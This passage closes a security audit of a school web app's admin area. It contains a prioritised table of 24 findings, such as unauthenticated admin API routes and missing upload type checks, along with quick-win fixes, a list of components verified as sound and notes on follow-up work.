- **Fix sketch:** Change `path: '/'` to `path: '/admin'`. Will require also changing the `/api/admin/*` and `/api/auth/*` routes to read the cookie correctly — these are at `/api`, not under `/admin`, so this would actually break middleware. Reconsider — current pattern is fine.

---

## PRIORITISED FIX TABLE

| # | Severity | Finding | Effort | Risk if unfixed |
|---|---|---|---|---|
| 1 | CRITICAL | `/api/admin/video-manager` no auth | ~15 min — drop `getAdminSession()` check on each handler | Anyone can wipe homepage videos / upload malicious files |
| 2 | CRITICAL | `/api/admin/media-library` no auth | ~15 min — same pattern | Storage exhaustion / arbitrary file upload |
| 3 | CRITICAL | `/api/admin/curriculum/sync-all` no auth | ~15 min — same pattern | Silent curriculum corruption for every student |
| 4 | HIGH | Hardcoded classroom_id mismatch with CLAUDE.md | ~30 min — verify in DB, lift to env var, update both routes + docs | Weekly uploads writing to wrong classroom forever |
| 5 | HIGH | Plaintext password === comparison | ~20 min — switch to `crypto.timingSafeEqual` after equal-length padding | Timing-side-channel auth bypass over time |
| 6 | HIGH | `ADMIN_PASSWORD` documented but not wired | ~5 min — remove from CLAUDE.md + .env.example | Doc lie, future maintainer confusion |
| 7 | HIGH | JWT carries no role distinction | ~30 min — add `role` to JWT payload + types + checks | Cannot differentiate super-admin from teacher |
| 8 | HIGH | Video upload no MIME allowlist | ~15 min — extension + content-type whitelist | XSS-via-SVG; arbitrary file in Storage |
| 9 | HIGH | Media-library upload no MIME allowlist | ~15 min — same pattern | Same |
| 10 | HIGH | Weekly-planning upload no size/type check | ~20 min — cap 10MB + .docx-only + per-IP rate limit | OOM / Anthropic budget burn |
| 11 | MED | Login route audit logs untruncated user input | ~10 min — truncate + strip | Audit log pollution |
| 12 | MED | `/api/admin/proxy-mode` doesn't exist (login page calls 3×) | ~10 min — delete the dead calls | Silent fetch failures, misleading UX |
| 13 | MED | Many admin pages call dead routes | ~2 hours — inventory + delete-or-implement | Buttons appear functional but silently fail |
| 14 | MED | `checkAuth()` calls non-existent `/api/videos` | ~5 min — delete the dead checks | False sense of defense-in-depth |
| 15 | MED | `getVideos`/`saveVideos` race condition | ~half day — migrate to DB table | Lost-update on concurrent uploads |
| 16 | MED | Description-Review crosses Whale↔Montree boundary | ~1 hour — decide ownership, move file | Mutates wrong classroom for Montree-logged-in user |
| 17 | MED | Middleware CSRF allows missing-Origin | ~1 hour — require Origin OR CSRF token for state-changing | Easier CSRF attack chain |
| 18 | MED | `/api/admin/curriculum/sync-all` mixes legacy + Montree tables | ~30 min — document boundary, plan deprecation | Silent break if `weekly_assignments` schema evolves |
| 19 | MED | `xhrUpload` slow retry | ~30 min — cap total retry time, surface retry button | Long opaque waits during upload failures |
| 20 | MED | Hardcoded `stats.children = 18` fallback | ~5 min — zero fallback | Misleading dashboard tile |
| 21 | MED | `lib/data.ts` cloud-mode brittle detection | ~10 min — explicit env var | Local dev accidentally writing to prod Storage |
| 22 | LOW | Card-generator CSS-injection (programmatic only) | ~10 min — whitelist fonts + validate color | Defense-in-depth only |
| 23 | LOW | Silent catch blocks | ~30 min — wire up `logServerError()` | Friction during debugging |
| 24 | LOW | Admin-token cookie `path: '/'` not `/admin` | n/a — leave as-is | Minor |

---

## QUICK WINS (<30 MIN EACH)

1. **Add `getAdminSession()` gate to the 3 `/api/admin/*` routes** — Three identical 5-line additions at the top of each file. Closes findings #1, #2, #3 (the entire CRITICAL row).
2. **Delete the `/api/admin/proxy-mode` calls from `/admin/login/page.tsx`** — 3 references, all of which 404. Closes finding #12.
3. **Delete every `checkAuth()` page-level function that calls `/api/videos`** — Pure cargo cult, doesn't work, middleware covers it. Closes finding #14.
4. **Remove `ADMIN_PASSWORD` from CLAUDE.md and `.env.example`** — Documentation accuracy. Closes finding #6.
5. **Truncate `username` in audit-log calls in `/api/auth/login`** — 1-line change. Closes finding #11.
6. **Fix `stats.children = 18` fallback** — 5-character change in `/admin/page.tsx`. Closes finding #20.
7. **Whitelist video-manager + media-library extensions** — Two 5-line additions. Closes findings #8, #9 partially.
8. **Verify the canonical Whale Class classroom_id in Supabase and update either CLAUDE.md or the two route files** — Whichever direction, this is a 30-min job. Closes finding #4.

Total quick-win effort: ~3 hours for 8 findings, of which 3 are CRITICAL.

---

## VERIFIED-CLEAN

These were checked and found to be in good shape:

- **Card generator XSS via labels** — `escapeHtml()` is applied on every interpolation of `card.label`. `sanitizeImageUrl()` allowlist prevents data-URL or external image sources.
- **`lib/auth.ts` JWT verification** — Uses `jose.jwtVerify`, throws on tampered tokens, lazy secret-key evaluation prevents build-time leaks. `ADMIN_SECRET` is `throw new Error` if missing — no default fallback.
- **Rate limiting on `/api/auth/login`** — `checkRateLimit(supabase, ip, '/api/auth/login', 5, 15)`. 5 attempts per 15 minutes per IP. Survives container restarts (DB-backed). Fails open if the rate limit table query errors (acceptable for a fail-open auth gate, given the alternative is locking out legitimate users on DB hiccup).
- **Logout route** — Cleanly deletes the cookie. Audit-logged. No injection vectors.
- **`createSupabaseAdmin()` singleton** — Reads env vars at runtime, never bakes them into the bundle. Has retry-with-jitter for Cloudflare timeouts.
- **Slugify** — Pure function, regex-based, deterministic. No injection surface.
- **`sanitizeImageUrl` allowlist** — Properly restricts to the Whale Supabase URL, two data-URL prefixes, and two local paths. No way to slip past.
- **Sorting-mat generator XSS via labels + title** — `escapeHtml()` applied. Document.write into a new window is safe given that scope.
- **`/api/whale/*` middleware protection** — Verified: middleware enforces `verifyAdminToken` on every `/api/whale/*` route except `/api/whale/parent/*` and `/api/whale/teacher/*`. Solid.
- **Picture-bingo generator at `/public/tools/picture-bingo-generator.html`** — Static HTML, no API surface, no auth needed. Documented as intentional.
- **The 7-day TTL + HttpOnly + Secure + SameSite=Lax cookie config** — Best practice for an admin session cookie. No notes.

---

## NOTES FOR FUTURE WORK

The Whale-Class admin surface was built before Tredoux locked in the "every route must auth-check" architectural rule that now governs Montree and Story. Closing the three CRITICAL findings is the single biggest win and brings the API surface in line with the rest of the codebase. Doing that PLUS the role-distinction in the JWT (finding #7) PLUS rotating the env-var documentation (finding #6) gets the surface to a posture where it can credibly be considered "trusted operator with audit trail" rather than "obscurity-protected."

The dead-API-page problem (finding #13) is the biggest UX cleanup and is probably worth a dedicated session — the admin tools listed in `app/admin/page.tsx` TOOLS array reference dozens of features that may or may not have backend support. A grep-driven inventory + decision per page would clear a lot of debt.

The hardcoded classroom-ID mismatch (finding #4) is the most surprising finding. It's worth resolving before anything else because: if the code is writing to a stale classroom, then every weekly upload Tredoux has done has been a no-op against the real Whale Class — and the symptoms of that bug (no progress updates appearing in the dashboard for weeks after upload) would be hard to attribute to this specific cause. Worth a 5-min Supabase query to confirm.
